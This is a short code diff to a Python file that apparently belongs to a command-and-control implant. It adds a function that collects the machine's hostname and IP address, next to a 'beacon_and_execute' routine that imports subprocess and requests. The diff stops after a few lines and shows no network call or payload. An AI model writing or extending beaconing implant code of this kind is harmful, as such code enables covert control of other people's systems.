@@ -1,7 +1,16 @@
 import subprocess
 import requests
+import socket
 from config import *
 from identity import *
+
+def get_host_info():
+    hostname = socket.gethostname()
+    try:
+        ip = socket.gethostbyname(hostname)
+    except socket.gaierror:
+        ip = "127.0.0.1"
+    return hostname, ip
 
 def beacon_and_execute():
     session = initialize_agent()
